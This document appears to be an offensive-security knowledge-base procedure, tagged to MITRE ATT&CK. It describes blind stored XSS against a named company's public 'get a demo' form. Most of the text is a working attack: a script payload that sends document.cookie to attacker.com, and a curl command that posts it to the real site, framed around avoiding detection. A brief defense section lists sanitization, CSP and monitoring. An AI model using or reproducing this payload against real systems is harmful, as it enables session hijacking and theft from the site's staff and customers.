---
id: proc-uuid-submit-payload
tags:
  - xss
  - stored-xss
  - form-injection
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:52:20.977Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Submit-Malicious-Payload-to-Upserve-Demo-Form

## Summary

This procedure involves submitting a malicious JavaScript payload through Upserve's public 'get a demo' form, exploiting the lack of input sanitization to store the payload in their CRM backend for later execution.

## Description

The Upserve demo form accepts user inputs like name, email, and company details, which are forwarded to a third-party marketing tool integrated with their CRM. Due to insufficient sanitization in the third-party package, injected scripts are stored and rendered without escaping when viewed in admin or customer dashboards. This blind stored XSS allows attackers to execute code in the victim's session context, potentially leading to data theft or account compromise. Prerequisites include access to the public form and a server to log beacon responses.

## Requirements

1. Web browser or proxy tool like Burp Suite for request manipulation
2. Controlled domain/server to receive exfiltration beacons
3. Knowledge of form fields (e.g., via inspecting the HTML form)

## Defense

Defensive measures and detection strategies:

- Implement client-side and server-side input sanitization using libraries like DOMPurify
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous form submissions or beacon requests to external domains

## Objectives

1. Store malicious payload in CRM without immediate detection
2. Set up for cross-context execution in target accounts
3. Confirm storage via later execution

## Instructions

### Step 1: Identify Form Endpoint

**Context**: Locate the demo form submission endpoint, typically a POST to /api/demo or similar.

Inspect the form using browser dev tools or Burp Suite to capture the request structure.

### Step 2: Craft and Submit Payload

**Context**: Inject the payload into a vulnerable field like 'company_name' or 'message'.

Use a blind payload such as:

```html
<script>var i=new Image();i.src='https://attacker.com/log?cookie='+document.cookie;</script>
```

Submit via browser form or curl equivalent:

```bash
curl -X POST https://upserve.com/get-a-demo \
  -d 'name=Test' \
  -d 'email=test@example.com' \
  -d 'company_name=<script>var i=new Image();i.src="https://attacker.com/log?cookie="+document.cookie;</script>' \
  -d 'message=Demo request'
```

> This sends the payload; expect a 200 OK response indicating acceptance.

### Step 3: Verify Submission

**Context**: Check for form success without errors.

Monitor server logs for any immediate beacons (unlikely in blind scenario).

**Expected Output**: HTTP 200 with success message; payload stored backend.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[xss]]
- [[stored-xss]]
- [[web]]
